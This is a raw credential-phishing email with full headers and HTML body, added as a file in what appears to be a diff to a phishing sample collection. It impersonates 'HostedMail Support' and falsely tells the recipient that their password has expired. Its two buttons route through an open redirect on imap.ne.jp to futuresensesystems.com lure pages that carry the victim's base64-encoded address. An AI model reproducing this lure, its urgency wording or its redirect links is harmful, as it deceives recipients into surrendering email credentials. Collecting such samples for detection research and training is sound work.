@@ -1,0 +1,427 @@
+Return-Path: admin@urbanwritingpros.com
+Delivered-To: jose@monkey.org
+X-FDA: 83132657412.36.253279F
+Received: from mail.urbanwritingpros.com (vmi2460967.contaboserver.net
+ [161.97.80.93])
+	by imf20.b.hostedemail.com (Postfix) with ESMTP id C318460002
+	for <jose@monkey.org>; Tue, 18 Feb 2025 10:17:48 +0000 (UTC)
+Authentication-Results: imf20.b.hostedemail.com;
+	dkim=pass header.d=urbanwritingpros.com header.s=dkim header.b=xv2MIWu9;
+	dmarc=pass (policy=none) header.from=urbanwritingpros.com;
+	spf=pass (imf20.b.hostedemail.com: domain of admin@urbanwritingpros.com
+ designates 161.97.80.93 as permitted sender)
+ smtp.mailfrom=admin@urbanwritingpros.com
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1739873869; a=rsa-sha256;
+	cv=none;
+	b=GKY2OemM2IKJzXpTnAIBF5XSZuFwKnlSEl0OoepmfcOKMj4+lJmVOlaC+qLkhUUo2tDBqO
+	Gu/yp5yeot2ApShuYtqXhof8MCpsmRjYC8OyHxoaTjUQcLSbPLqkMl4KPGoGQ6VVL/JpeN
+	FruxEovxB88AyxbRvYIlaJGwBSjdSGI=
+ARC-Authentication-Results: i=1;
+	imf20.b.hostedemail.com;
+	dkim=pass header.d=urbanwritingpros.com header.s=dkim header.b=xv2MIWu9;
+	dmarc=pass (policy=none) header.from=urbanwritingpros.com;
+	spf=pass (imf20.b.hostedemail.com: domain of admin@urbanwritingpros.com
+ designates 161.97.80.93 as permitted sender)
+ smtp.mailfrom=admin@urbanwritingpros.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;
+	s=arc-20220608; t=1739873869;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=pTpxgVuZhwWrd70/GgnV9e/IYAdIEisu18Q0t0Ht4dE=;
+	b=2/B+oad/2caicGgzq0RbZPrAEG5FWSKetkHVqygXl7tKfuRyMgurxZvDwobMBrIPqEobLO
+	37vA1SaPG3nkAE2h/SdA9REUZwLc521okQdTJgttdbe7Ee59Icy7SUML/EwnsnR9ojoB/Q
+	ammpRKkou2283x+EleQw+4XXrZ9mJiY=
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; s=dkim;
+ d=urbanwritingpros.com;
+ h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type:
+ Content-Transfer-Encoding; i=admin@urbanwritingpros.com;
+ bh=pTpxgVuZhwWrd70/GgnV9e/IYAdIEisu18Q0t0Ht4dE=;
+ b=xv2MIWu9vwf42aZhvwwmou7ZaGPHptnmzZSs0tOMadmi0gBMDICrOLF8lwwojG3vJBl1xWuspee+
+   97PWeCEM5sVfnWO3srkkNWN/tJwSnPIdDLVDvi9DNCKfSytiAcnGUdi9ErLZ7/3xXchDgv4iMMNu
+   fq81m0fRJnGZEXqU4Og=
+From: HostedMail Support <admin@urbanwritingpros.com>
+To: jose@monkey.org
+Subject: Login Expiry for ****@monkey.org | 2/18/2025 1:45:49 a.m.
+Date: 18 Feb 2025 01:45:49 -0800
+Message-ID: <20250218014549.14A0647553197F46@urbanwritingpros.com>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+X-Spam-Status: No, score=0.30
+X-Rspamd-Server: rspam04
+X-Rspamd-Queue-Id: C318460002
+X-Stat-Signature: rammok33spoyupxwysscoofis759w3go
+X-Rspam-User: 
+X-HE-Tag: 1739873868-75014
+X-HE-Meta: 
+ U2FsdGVkX19K8k8aiv17SJkzflkjI/WrDYmewWnt3nVeFHHR2B9zzG1IMLax9+9olbMxDqeP++3CTnlDq4dLL5v5wwXQ1D8gHBYK/F8VqWK3gwHYKxOy3Y+Ovht0h3j0vy5Iak5MqtSlpmVjcBn4QCtJoHjTLlazSnmEJzFhvs9AQ890EczVL+22s/EQjnIiIUgQ1Xtz08bgA+e26xl6To4XGHgyhjVbLe4XbPKDEZieAls4gQs5h5iZ0Lh4jYai1tefL7+tOqeHJ2G6JWCZSYtZoGmMxuMkEw6idx46WzdkHbR8YejP4clxXY9/U2U/1vUOgDaiLyg+Vod1BOYNs5TfykDi8MrG3AsEau05OmOeWUZX6RL6Z9QiuwEyR66uRxLYKGPbMwgZidl6N4qdQkhkgKoxve26m0mb+6Dgl05BxOTAaHIXCViOaozL9YeJ0JRnCPbv2AP1Y7Nq/YHSN5+NLpzV+RlYYwNABH+p7eng6s82ZwLLaWseMB54JGTtLRA+MTZW9v6003hjNWP9PcSVKQQA6y0ySXB4XwSZufjfkezEn2ArHjOHpNDosV3JdvjhSCOYsJ48Wf5J7+IzthIIc2mhC/tAtsaeKsfbpR1exg6At8XzuIg6XNQqI8yzroPwv3y8RgU87sUe3dZW1XGZFpoJW5yiO5yNxHqj+s0IzgMUCvjoknbqfqYqJciwU5SyfdOvZjzz0TUrzyCEgWr8fzYiGDjnHvzj49MPE5I27KF/sKKgSQTEPw6c3dhCKcZ/v+fgNNkKqM9q4txBV3C8ths9joWdVturrKbVMUFvRYkGh1RBIjFF0it/h0ffgDSzm7jmZB5rbIvXd4gFTL90gSwHlFpEo5NFwpFTj5E2GanEGTaP0sojS8D73F1lqxthVgdIrbJ7KwZ8oM0l0+F/WhnZxcvMxbDjiP8e7S0sWE8l6CWPXfMF9Y0sHGL3CgjydSvuViMtGzcJC3jTOqVstwI
+ i5t+q2uxNARUn6oHRYlXZwMyNRgTSJ160iskrjAI6xEAJhmVN3ByOQW3RPBwf6eiJlSPqD94dhEGMUljCeZ6Hx3cyypRo4j1sZinuPe/QpmNsrgc3NNx9ihFMWkB5hzsNwIlZftQTdlIajPRjawG68tWfRFOPITM8f03bD0hYQUy8VHw=
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 50
+
+<html><head>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body>
+<div style=3D'text-align: left; color: rgb(33, 33, 33); text-transform: non=
+e; line-height: normal; text-indent: 0px; letter-spacing: normal; padding-t=
+op: 0px; font-family: "Segoe UI","Segoe WP",Tahoma,Arial,sans-serif,serif,E=
+mojiFont; font-size: 15px; font-style: normal; font-weight: 400; word-spaci=
+ng: 0px; border-top-color: currentColor; border-top-width: 0px; border-top-=
+style: none; white-space: normal; orphans: 2; widows: 2; background-color: =
+rgb(255, 255, 255);'>
+<div align=3D"center" style=3D"line-height: normal; padding-top: 0px; borde=
+r-top-color: currentColor; border-top-width: 0px; border-top-style: none;">=
+
+<table width=3D"640" style=3D"border-width: 0px; width: 480pt; line-height:=
+ normal; border-collapse: collapse; border-spacing: 0px; background-repeat:=
+ repeat; background-color: transparent;" border=3D"0" cellspacing=3D"0" cel=
+lpadding=3D"0">
+<tbody style=3D"line-height: normal;">
+<tr style=3D"line-height: normal;">
+<td valign=3D"top" style=3D"margin: 0px; padding: 0in; line-height: normal;=
+ font-family: Roboto,RobotoDraft,Helvetica,Arial,sans-serif;">
+<div align=3D"center" style=3D"line-height: normal; padding-top: 0px; borde=
+r-top-color: currentColor; border-top-width: 0px; border-top-style: none;">=
+
+<table width=3D"640" style=3D"border-width: 0px; width: 480pt; line-height:=
+ normal; border-collapse: collapse; border-spacing: 0px; background-color: =
+transparent;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+<tbody style=3D"line-height: normal;">
+<tr style=3D"line-height: normal;">
+<td valign=3D"top" style=3D"margin: 0px; padding: 0in 0in 9pt; line-height:=
+ normal;">
+<div align=3D"center" style=3D"line-height: normal; padding-top: 0px; borde=
+r-top-color: currentColor; border-top-width: 0px; border-top-style: none;">=
+
+<table width=3D"640" style=3D"border-width: 0px; width: 480pt; line-height:=
+ normal; border-collapse: collapse; border-spacing: 0px; background-color: =
+transparent;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+<tbody style=3D"line-height: normal;">
+<tr style=3D"line-height: normal;">
+<td width=3D"616" valign=3D"top" style=3D"margin: 0px; padding: 0in 0.25in =
+9pt; width: 462pt; line-height: normal;">
+<table width=3D"592" style=3D"border-width: 0px; width: 444pt; line-height:=
+ normal; border-collapse: collapse; border-spacing: 0px; background-color: =
+transparent;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+<tbody style=3D"line-height: normal;">
+<tr style=3D"line-height: normal;">
+<td valign=3D"top" style=3D"margin: 0px; padding: 0in; line-height: normal;=
+">
+<p style=3D"margin: 0in 0in 12pt; line-height: 27pt; font-family: Calibri,s=
+ans-serif; font-size: 12pt;"><span style=3D"line-height: normal;"><span sty=
+le=3D'color: rgb(26, 26, 31); line-height: normal; letter-spacing: -0.1pt; =
+font-family: "Segoe UI Semibold",sans-serif,serif,EmojiFont; font-size: 21p=
+t;'><span style=3D"font-weight: bolder;"><span style=3D"vertical-align: inh=
+erit;"><span style=3D"vertical-align: inherit;"><span style=3D"vertical-ali=
+gn: inherit;"><span style=3D"vertical-align: inherit;">
+<span style=3D"vertical-align: inherit;"><span style=3D"vertical-align: inh=
+erit;"><span>&nbsp;</span>Your password has
+expired</span></span></span></span></span></span></span><span style=3D"font=
+-weight: bolder;">&nbsp;&nbsp;&nbsp;<br>
+</span></span></span></p>
+<p style=3D"margin: 0in; line-height: normal; font-family: Calibri,sans-ser=
+if; font-size: 12pt;"><span style=3D'color: rgb(26, 26, 31); line-height: n=
+ormal; font-family: "Segoe UI",sans-serif,serif,EmojiFont; background-repea=
+t: repeat;'><span style=3D"vertical-align: inherit;"><span style=3D"vertica=
+l-align: inherit;"><span style=3D"vertical-align: inherit;"><span style=3D"=
+vertical-align: inherit;"><span style=3D"vertical-align: inherit;">
+<span style=3D"vertical-align: inherit;">Your
+jose@monkey.org password by default will expire today. Please follow the
+steps below immediately to ensure you do not get<span>&nbsp;</span></span><=
+/span></span></span></span></span></span><span style=3D"vertical-align: inh=
+erit;"><span style=3D'color: rgb(26, 26, 31); line-height: normal; font-fam=
+ily: "Segoe UI",sans-serif,serif,EmojiFont; background-repeat: repeat;'>
+<span style=3D"vertical-align: inherit;"><span style=3D"vertical-align: inh=
+erit;"><span style=3D"vertical-align: inherit;"><span style=3D"vertical-ali=
+gn: inherit;"><span style=3D"vertical-align: inherit;">locked
+out</span></span></span></span></span></span></span><span style=3D"vertical=
+-align: inherit;"><span style=3D"vertical-align: inherit;">
+<span>&nbsp;</span><span>&nbsp;</span></span></span><span style=3D'color: r=
+gb(26, 26, 31); line-height: normal; font-family: "Segoe UI",sans-serif,ser=
+if,EmojiFont; background-repeat: repeat;'><span style=3D"vertical-align: in=
+herit;"><span style=3D"vertical-align: inherit;"><span style=3D"vertical-al=
+ign: inherit;">
+<span style=3D"vertical-align: inherit;"><span>&nbsp;</span><span style=3D"=
+vertical-align: inherit;"><span style=3D"vertical-align: inherit;">of
+your email account.</span></span></span></span></span></span><span style=3D=
+"line-height: normal;">&nbsp;</span><br>
+<br>
+</span></p>
+</td>
+<td valign=3D"top" style=3D"margin: 0px; padding: 0in; width: 0.3pt; line-h=
+eight: normal;">&nbsp;</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+<div align=3D"center" style=3D"line-height: normal;">
+<table width=3D"640" style=3D"border-width: 0px; width: 480pt; line-height:=
+ normal; border-collapse: collapse; border-spacing: 0px; background-color: =
+transparent;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+<tbody style=3D"line-height: normal;">
+<tr style=3D"line-height: normal;">
+<td width=3D"616" valign=3D"top" style=3D"margin: 0px; padding: 9pt 0.25in;=
+ width: 462pt; line-height: normal;">
+<table width=3D"592" style=3D"border-width: 0px; width: 444pt; line-height:=
+ normal; border-collapse: collapse; border-spacing: 0px; background-color: =
+transparent;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+<tbody style=3D"line-height: normal;">
+<tr style=3D"line-height: normal;">
+<td valign=3D"top" style=3D"margin: 0px; padding: 0in; line-height: normal;=
+">
+<table style=3D"border-width: 0px; line-height: normal; border-collapse: co=
+llapse; border-spacing: 0px; background-color: transparent;" border=3D"0" c=
+ellspacing=3D"0" cellpadding=3D"0">
+<tbody style=3D"line-height: normal;">
+<tr style=3D"line-height: normal;">
+<td align=3D"center" style=3D"margin: 0px; padding: 8px 12px; line-height: =
+20px; font-size: 14px;" bgcolor=3D"#eaeaea"><a style=3D"padding: 0px; color=
+: rgb(33, 33, 33); line-height: normal; font-size: 15px; text-decoration: n=
+one; cursor: pointer; background-color: transparent;" href=3D"https://www.i=
+map.ne.jp/banner_click/add/20/1/?a&amp;url=3Dhttps://futuresensesystems.com=
+/hosted/zsxgog/am9zZUBtb25rZXkub3Jn" target=3D"_blank" rel=3D"noreferrer"><=
+span style=3D"font-weight: bolder;">
+<span style=3D"vertical-align: inherit;"><span style=3D"vertical-align: inh=
+erit;"><span style=3D"vertical-align: inherit;"><span style=3D"vertical-ali=
+gn: inherit;"><span style=3D"vertical-align: inherit;"><span style=3D"verti=
+cal-align: inherit;">Keep Current Password</span></span></span></span></spa=
+n></span>
+</span></a></td>
+<td style=3D"margin: 0px; padding: 10px 4px; color: rgb(102, 102, 102); lin=
+e-height: 20px; font-size: 14px; vertical-align: top; border-bottom-style: =
+none;">&nbsp;</td>
+<td style=3D"margin: 0px; padding: 10px 100px; color: rgb(102, 102, 102); l=
+ine-height: 20px; font-size: 14px; vertical-align: top; border-bottom-style=
+: none;"><br>
+</td>
+<td align=3D"center" style=3D"margin: 0px; padding: 8px 12px; line-height: =
+20px; font-size: 14px;" bgcolor=3D"#007acc"><a style=3D"padding: 0px; color=
+: white; line-height: normal; font-size: 15px; text-decoration: none; curso=
+r: pointer; background-color: transparent;" href=3D"https://www.imap.ne.jp/=
+banner_click/add/20/1/?a&amp;url=3Dhttps://futuresensesystems.com/hosted/ns=
+cvob/am9zZUBtb25rZXkub3Jn" target=3D"_blank" rel=3D"noreferrer"><span style=
+=3D"font-weight: bolder;">
+<span style=3D"vertical-align: inherit;"><span style=3D"vertical-align: inh=
+erit;"><span style=3D"vertical-align: inherit;"><span style=3D"vertical-ali=
+gn: inherit;"><span style=3D"vertical-align: inherit;"><span style=3D"verti=
+cal-align: inherit;">Edit My Password</span></span></span></span></span></s=
+pan></span></a></td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+<td style=3D"margin: 0px; padding: 0in; width: 0.3pt; line-height: normal;"=
+>&nbsp;</td>
+</tr>
+</tbody>
+</table>
+</div>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+</div>
+<div align=3D"center" style=3D'color: rgb(33, 33, 33); text-transform: none=
+; line-height: normal; text-indent: 0px; letter-spacing: normal; font-famil=
+y: "Segoe UI","Segoe WP",Tahoma,Arial,sans-serif,serif,EmojiFont; font-size=
+: 15px; font-style: normal; font-weight: 400; word-spacing: 0px; white-spac=
+e: normal; orphans: 2; widows: 2; background-color: rgb(255, 255, 255);'>
+<table width=3D"640" style=3D"border-width: 0px; width: 480pt; line-height:=
+ normal; border-collapse: collapse; border-spacing: 0px; background-color: =
+transparent;" border=3D"1" cellspacing=3D"0" cellpadding=3D"0">
+<tbody style=3D"line-height: normal;">
+<tr style=3D"line-height: normal;">
+<td valign=3D"top" style=3D"border-width: 1pt; margin: 0px; padding: 9pt 0i=
+n; line-height: normal; font-family: Roboto,RobotoDraft,Helvetica,Arial,san=
+s-serif; border-top-style: solid;">
+<div align=3D"center" style=3D"line-height: normal; padding-top: 0px; borde=
+r-top-color: currentColor; border-top-width: 0px; border-top-style: none;">=
+
+<table width=3D"640" style=3D"border-width: 0px; width: 480pt; line-height:=
+ normal; border-collapse: collapse; border-spacing: 0px; background-color: =
+transparent;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+<tbody style=3D"line-height: normal;">
+<tr style=3D"line-height: normal;">
+<td width=3D"616" valign=3D"top" style=3D"margin: 0px; padding: 9pt 0.25in;=
+ width: 462pt; line-height: normal;">
+<table width=3D"592" style=3D"border-width: 0px; width: 444pt; line-height:=
+ normal; border-collapse: collapse; border-spacing: 0px; background-color: =
+transparent;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+<tbody style=3D"line-height: normal;">
+<tr style=3D"line-height: normal;">
+<td valign=3D"top" style=3D"margin: 0px; padding: 0in; line-height: normal;=
+">
+<p style=3D"margin: 0in 0in 12pt; line-height: 24pt; font-family: Calibri,s=
+ans-serif; font-size: 12pt;"><span style=3D"line-height: normal; font-weigh=
+t: bold;"><span style=3D"line-height: normal; font-size: 18pt;"><span style=
+=3D"vertical-align: inherit;"><span style=3D"vertical-align: inherit;"><spa=
+n style=3D"vertical-align: inherit;"><span style=3D"vertical-align: inherit=
+;"><span style=3D"vertical-align: inherit;"><span style=3D"vertical-align: =
+inherit;">
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
+sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+Account Information Concerned:</span></span></span></span></span></span></s=
+pan></span></p>
+<p style=3D"margin: 0in 0in 9pt; line-height: 18pt; font-family: Calibri,sa=
+ns-serif; font-size: 12pt;"><span style=3D"line-height: normal; font-weight=
+: bold;"><span style=3D'color: rgb(26, 26, 31); line-height: normal; font-f=
+amily: "Segoe UI Semibold",sans-serif,serif,EmojiFont;'><span style=3D"vert=
+ical-align: inherit;"><span style=3D"vertical-align: inherit;">
+<span style=3D"vertical-align: inherit;"><span style=3D"vertical-align: inh=
+erit;"><span style=3D"vertical-align: inherit;"><span style=3D"vertical-ali=
+gn: inherit;">Email address:&nbsp;</span></span></span></span></span></span=
+></span></span>&nbsp;&nbsp;&nbsp;<span style=3D"vertical-align: inherit; ba=
+ckground-color: rgb(255, 255, 255);"><span>&nbsp;</span>
+<span>&nbsp;</span><span style=3D'color: rgb(37, 36, 35); line-height: norm=
+al; letter-spacing: 0px; font-family: "SF Regular","Segoe System UI Regular=
+","Segoe UI Regular",sans-serif; font-size: 14px;'><span style=3D"vertical-=
+align: inherit;"><span style=3D"vertical-align: inherit;"><span style=3D"ve=
+rtical-align: inherit;">&nbsp;<span style=3D"vertical-align: inherit;">
+<span>&nbsp;</span><span>&nbsp;</span><span style=3D"vertical-align: inheri=
+t;">&nbsp;&nbsp;jose@monkey.org</span></span></span></span></span></span></=
+span><br style=3D"line-height: normal;">
+<span style=3D'color: rgb(37, 36, 35); line-height: normal; letter-spacing:=
+ 0px; font-family: "SF Regular","Segoe System UI Regular","Segoe UI Regular=
+",sans-serif; font-size: 14px; background-color: rgb(219, 244, 253);'></spa=
+n></p>
+<p style=3D"margin: 0in 0in 9pt; line-height: 18pt; font-family: Calibri,sa=
+ns-serif; font-size: 12pt;"><span style=3D"font-weight: bolder;"><span styl=
+e=3D"line-height: normal;"><span style=3D'color: rgb(26, 26, 31); line-heig=
+ht: normal; font-family: "Segoe UI Semibold",sans-serif,serif,EmojiFont;'><=
+span style=3D"vertical-align: inherit;"><span style=3D"vertical-align: inhe=
+rit;"><span style=3D"vertical-align: inherit;"><span style=3D"vertical-alig=
+n: inherit;"><span style=3D"vertical-align: inherit;">
+<span style=3D"vertical-align: inherit;">Password
+status:</span></span></span></span></span></span><span style=3D"line-height=
+: normal;">&nbsp;&nbsp;&nbsp;</span></span></span><span>&nbsp;</span><span>=
+&nbsp;</span><span style=3D"color: rgb(243, 12, 46);"><span style=3D"vertic=
+al-align: inherit;"><span style=3D"vertical-align: inherit;">
+<span style=3D"vertical-align: inherit;"><span style=3D"vertical-align: inh=
+erit;"><span style=3D"vertical-align: inherit;">&nbsp;<span>&nbsp;</span><s=
+pan style=3D"vertical-align: inherit;">Expired</span></span></span></span><=
+/span></span></span></span></p>
+</td>
+<td valign=3D"top" style=3D"margin: 0px; padding: 0in; width: 0.3pt; line-h=
+eight: normal;">&nbsp;</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+<div align=3D"center" style=3D'color: rgb(33, 33, 33); text-transform: none=
+; line-height: normal; text-indent: 0px; letter-spacing: normal; font-famil=
+y: "Segoe UI","Segoe WP",Tahoma,Arial,sans-serif,serif,EmojiFont; font-size=
+: 15px; font-style: normal; font-weight: 400; word-spacing: 0px; white-spac=
+e: normal; orphans: 2; widows: 2; background-color: rgb(255, 255, 255);'>
+<table width=3D"640" style=3D"border-width: 0px; width: 480pt; line-height:=
+ normal; border-collapse: collapse; border-spacing: 0px; background-repeat:=
+ repeat; background-color: transparent;" border=3D"0" cellspacing=3D"0" cel=
+lpadding=3D"0">
+<tbody style=3D"line-height: normal;">
+<tr style=3D"line-height: normal;">
+<td valign=3D"top" style=3D"margin: 0px; padding: 0in; line-height: normal;=
+ font-family: Roboto,RobotoDraft,Helvetica,Arial,sans-serif;">
+<div align=3D"center" style=3D"line-height: normal; padding-top: 0px; borde=
+r-top-color: currentColor; border-top-width: 0px; border-top-style: none;">=
+
+<table width=3D"640" style=3D"border-width: 0px; width: 480pt; line-height:=
+ normal; border-collapse: collapse; border-spacing: 0px; background-image: =
+none; background-repeat: repeat; background-color: rgb(244, 244, 244);" bor=
+der=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+<tbody style=3D"line-height: normal;">
+<tr style=3D"line-height: normal;">
+<td valign=3D"top" style=3D"margin: 0px; padding: 9pt 0in; line-height: nor=
+mal;">
+<div align=3D"center" style=3D"line-height: normal; padding-top: 0px; borde=
+r-top-color: currentColor; border-top-width: 0px; border-top-style: none;">=
+
+<table width=3D"640" style=3D"border-width: 0px; width: 480pt; line-height:=
+ normal; border-collapse: collapse; border-spacing: 0px; background-color: =
+transparent;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+<tbody style=3D"line-height: normal;">
+<tr style=3D"line-height: normal;">
+<td valign=3D"top" style=3D"margin: 0px; padding: 9pt 0.25in; width: 0.3pt;=
+ line-height: normal;">
+<table width=3D"592" style=3D"border-width: 0px; width: 444pt; line-height:=
+ normal; border-collapse: collapse; border-spacing: 0px;" border=3D"0" cell=
+spacing=3D"0" cellpadding=3D"0">
+<tbody style=3D"line-height: normal;">
+<tr style=3D"line-height: normal;">
+<td valign=3D"top" style=3D"margin: 0px; padding: 0in; line-height: normal;=
+">
+<p style=3D"margin: 0in; line-height: 12pt; font-family: Calibri,sans-serif=
+; font-size: 12pt;"><span style=3D"background-color: rgb(243, 243, 243);"><=
+span style=3D"color: rgb(51, 51, 51); font-family: Roboto,Arial; font-size:=
+ 12px; font-weight: 600;"><span style=3D"vertical-align: inherit;"><span st=
+yle=3D"vertical-align: inherit;"><span style=3D"vertical-align: inherit;"><=
+span style=3D"vertical-align: inherit;"><span style=3D"vertical-align: inhe=
+rit;"><span style=3D"vertical-align: inherit;">
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
+sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr>&nbsp;&nbsp;&nbsp;&nbsp; &copy; 2025&nbs=
+p;</span></span>&nbsp;</span></span>&nbsp;</span></span><span>&nbsp;</span>=
+</span>&nbsp;&nbsp;<span style=3D"vertical-align: inherit;"><span>&nbsp;</s=
+pan>
+<span style=3D"color: rgb(51, 51, 51); font-family: Roboto,Arial; font-size=
+: 12px; font-weight: 600;"><span style=3D"vertical-align: inherit;"><span s=
+tyle=3D"vertical-align: inherit;"><span style=3D"vertical-align: inherit;">=
+<span style=3D"vertical-align: inherit;"><span>&nbsp;</span><span style=3D"=
+vertical-align: inherit;"><span>
+&nbsp;</span>Mail Support | User Agreement | Privacy Policy | Copyright
+Policy.</span></span></span></span>&nbsp;</span>&nbsp;</span></span><span s=
+tyle=3D"color: rgb(51, 51, 51); font-family: Roboto,Arial; font-size: 12px;=
+ font-weight: 600;">&nbsp;</span><span style=3D"color: rgb(51, 51, 51); fon=
+t-family: Roboto,Arial; font-size: 12px; font-weight: 600;"></span></span><=
+/p>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+
+
+
+</body></html>
+
